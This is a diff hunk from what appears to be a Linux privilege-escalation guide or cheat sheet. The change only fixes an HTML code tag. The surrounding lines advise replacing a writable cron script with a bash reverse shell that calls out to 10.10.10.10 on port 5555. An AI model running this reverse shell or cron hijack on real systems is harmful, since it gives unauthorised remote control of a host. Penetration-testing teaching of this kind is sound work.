@@ -265,7 +265,7 @@ Check if you can view crontab :
 Do you see a script that is running that your user have premision to edit? If you do, replace the content with a bash reverse-shell:
 
 
-code>#!/bin/bash</code>
+<code>#!/bin/bash</code>
 
 <code>bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>
 
